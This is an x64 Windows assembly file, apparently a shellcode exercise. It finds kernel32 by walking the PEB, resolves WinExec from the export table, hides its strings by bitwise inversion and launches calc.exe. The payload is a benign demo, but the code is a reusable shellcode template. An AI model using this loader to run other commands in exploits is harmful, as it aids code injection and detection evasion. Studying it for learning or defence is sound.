; nasm -f win64 -o mycalc.o mycalc.asm
; ld -s -o mycalc.exe mycalc.o

section .text
global _start

_start:
; get &kernel32
    xor rcx, rcx
    mov rax, gs:[rcx + 0x60]
    mov rax, [rax + 0x18]
    mov rax, [rax + 0x20]
    mov rax, [rcx + rax]
    mov rax, [rcx + rax]
    mov rbx, [rax + 0x20]
    ; mov rsi, [rax + 0x18]   ; _PEB_LDR_DATA
    ; mov rsi, [rsi + 0x20]   ; PEB_LDR_DATA->InMemoryOrderModuleList
    ; mov r13, [rsi + 0x20]   ; &mycalc
    ; mov rsi, [rsi]          ; Ldr->Flink
    ; mov r14, [rsi + 0x20]   ; &ntdll32
    ; mov rsi, [rsi]          ; Ldr->Flink
    ; mov r15, [rsi + 0x20]   ; &kernel32
    ; mov rbx, [rsi + 0x20]   ; &kernel32

; Get kernel32.dll &ExportTable
    mov r8, rbx             ; copy &kernel32 to r8
    mov ebx, [rbx + 0x3C]   ; &kernel32 >e_lfanew offset
    add rbx, r8             ; &kernel32 PE Header
    xor rcx, rcx
    add cx, 0x8811
    shr rcx, 0x8
    mov edx, [rbx + rcx]   ; RVA ExportTable = &kernel32 PE Header + 0x88
    add rdx, r8             ; &ExportTable = &kernel32 + RVA ExportTable

; Get &AddressOfFunctions from Kernel32.dll ExportTable
    xor r10, r10            ; Clear r10
    mov r10d, [rdx+0x1C]    ; RVA AddressTable (AddressOfFunctions value)
    add r10, r8             ; &AddressTable (&kernel32 + AddressOfFunctions value)

; Get &NamePointerTable from Kernel32.dll ExportTable
    xor r11, r11
    mov r11d, [rdx+0x20]    ; RVA NamePointerTable (AddressOfNames value)
    add r11, r8             ; &NamePointerTable (&kernel32 + AddressOfNames value)

; Get &OrdinalTable from Kernel32.dll ExportTable
    xor r12, r12
    mov r12d, [rdx+0x24]    ; RVA OrdinalTable (AddressOfNameOrdinals value)
    add r12, r8             ; &OrdinalTable (&kernel32 + AddressOfNameOrdinals value)

; API Names to resolve addresses
    xor rcx, rcx
    add cl, 0x7                 ; String length for compare string
    mov rax, 0x9C9A87BA9196A80F ; not 0x9C9A87BA9196A80F = 0xF0,WinExec
    not rax                     ; cexEniW,0xF0 : 0x636578456e6957F0
    shr rax, 0x8                ; 0x636578456e6957F0 -> 0x00636578456e6957
    lea rsi, [rax]              ; RSI = "WinExec"
    xor rax, rax                ; Setup Counter for resolving the API Address after finding the name string
    loop:
    xor rcx, rcx
    add cl, 0x7                 ; String length for compare string
    xor rdi,rdi             ; Clear RDI for setting up string name retrieval
    mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
    add rdi, r8             ; RDI = &NameString    = RVA NameString + &kernel32.dll
    mov rdi, [rdi]
    cmp rsi, rdi            ; if RDX == RDI { jmp resolveraddr }
    je resolveaddr
    inc rax
    jmp short loop

resolveaddr:
    mov ax, [r12+rax*2]
    mov eax, [r10+rax*4]
    add rax, r8
    mov r14, rax                ; R14 = Kernel32.WinExec Address

; UINT WinExec(
;   LPCSTR lpCmdLine,    => RCX = "calc.exe",0x0
;   UINT   uCmdShow      => RDX = 0x1 = SW_SHOWNORMAL
; );
    xor rcx, rcx
    mul rcx                     ; RAX & RDX & RCX = 0x0
    ; calc.exe | String length : 8
    push rax                    ; push 0x0
    mov rax, 0x9A879AD19C939E9C ; not 0x9A879AD19C939E9C = "calc.exe"
    not rax
    push rax
    mov rcx, rsp                ; RCX = "calc.exe",0x0
    inc rdx                     ; RDX = 0x1 = SW_SHOWNORMAL
    sub rsp, 0x28               ; adjust stack
    call r14                    ; Call WinExec("calc.exe", SW_HIDE)
